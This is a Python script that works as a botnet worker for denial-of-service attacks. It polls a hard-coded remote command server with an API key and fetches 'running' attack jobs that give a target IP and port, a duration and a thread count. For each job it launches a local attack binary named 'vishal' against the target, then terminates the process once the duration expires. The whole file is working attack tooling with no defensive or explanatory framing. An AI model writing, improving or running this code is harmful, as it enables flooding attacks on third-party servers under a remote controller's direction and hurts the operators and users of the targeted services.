import requests
import subprocess
import time
import json
import os

BASE_URL = 'http://3.228.19.162:80'
API_KEY_FILE = 'api_key.txt'

# Track active attacks
active_tasks = {}

def load_api_key():
    """Load API key from file"""
    try:
        with open(API_KEY_FILE, 'r') as f:
            return f.read().strip()
    except:
        return None

def fetch_running_attacks(api_key):
    """Fetch only RUNNING attacks from server"""
    try:
        headers = {'X-API-Key': api_key}
        response = requests.get(f'{BASE_URL}/status', headers=headers, timeout=5)
        
        if response.status_code == 200:
            data = response.json()
            attacks = []
            
            for attack in data.get('attacks', []):
                if attack.get('status', '').lower() == 'running':
                    attacks.append(attack)
            
            return attacks
    except:
        return []
    
    return []

def process_attack(attack_info):
    """Process only RUNNING attacks"""
    attack_id = attack_info.get('attack_id', '')
    status = attack_info.get('status', '').lower()
    
    # ONLY process RUNNING attacks
    if status != 'running':
        print(f"[!] Skipping {attack_id} (status: {status})")
        return
    
    # Skip if already processing
    if attack_id in active_tasks:
        return
    
    target = attack_info.get('target', '')
    if ':' not in target:
        return
    
    ip, port = target.split(':')
    duration = attack_info.get('duration', 60)
    threads = attack_info.get('threads', 10)
    
    print(f"[+] Running attack: {ip}:{port} ({duration}s, {threads} threads)")
    
    if not os.path.exists('./vishal'):
        return
    
    try:
        # Run vishal
        cmd = ['./vishal', ip, port, str(duration), str(threads)]
        process = subprocess.Popen(cmd)
        
        active_tasks[attack_id] = {
            'process': process,
            'start_time': time.time(),
            'duration': duration
        }
        
        print(f"[+] Started PID: {process.pid}")
    except:
        pass

def clean_completed_tasks():
    """Remove completed tasks"""
    current = time.time()
    to_remove = []
    
    for attack_id, task in active_tasks.items():
        process = task['process']
        
        # Check if process finished
        if process.poll() is not None:
            to_remove.append(attack_id)
        # Check if time expired
        elif current - task['start_time'] > task['duration'] + 5:
            try:
                process.terminate()
            except:
                pass
            to_remove.append(attack_id)
    
    for attack_id in to_remove:
        del active_tasks[attack_id]
    
    return len(to_remove)

def main():
    """Main loop"""
    print("[+] Worker started")
    
    api_key = load_api_key()
    if not api_key:
        print("[!] No API key found in api_key.txt")
        return
    
    print(f"[+] API key loaded")
    
    while True:
        try:
            # Get RUNNING attacks only
            attacks = fetch_running_attacks(api_key)
            
            if attacks:
                print(f"[+] Found {len(attacks)} running attacks")
                
                # Process each RUNNING attack
                for attack in attacks:
                    process_attack(attack)
            else:
                print("[+] No running attacks")
            
            # Clean up
            cleaned = clean_completed_tasks()
            if cleaned > 0:
                print(f"[+] Cleaned {cleaned} tasks")
            
            time.sleep(3)
            
        except KeyboardInterrupt:
            print("\n[!] Stopping...")
            break
        except:
            time.sleep(5)

if __name__ == '__main__':
    main()
